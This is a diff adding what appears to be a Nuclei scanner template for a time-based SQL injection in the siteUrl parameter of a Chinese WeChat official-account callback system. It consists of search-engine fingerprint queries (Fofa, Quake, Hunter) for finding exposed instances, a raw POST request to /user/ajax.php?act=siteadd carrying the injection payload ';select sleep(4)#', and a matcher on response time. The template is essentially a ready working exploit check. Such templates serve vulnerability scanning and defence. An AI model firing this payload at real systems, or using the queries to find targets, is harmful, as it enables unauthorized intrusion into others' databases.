@@ -1,0 +1,38 @@
+id: WeChat_mp_callback_system_siteUrl_Sqli
+
+info:
+  name: WeChat_mp_callback_system_siteUrl_Sqli
+  author: security-xm
+  severity: high
+  description: 公众号无限回调系统接口siteUrl存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="mb-5 web-font-desc"
+    Quake-query: body="mb-5 web-font-desc"
+    Hunter-query: body="mb-5 web-font-desc"
+    verified: true
+
+http:
+  - raw:
+    - |-
+      @timeout: 30s
+      POST /user/ajax.php?act=siteadd HTTP/1.1
+      Host: {{Hostname}}
+      Cache-Control: max-age=0
+      Upgrade-Insecure-Requests: 1
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+      Content-Type: application/x-www-form-urlencoded
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+      Connection: close
+      Content-Length: 27
+
+      siteUrl=';select sleep(4)#'
+
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration >= 4'
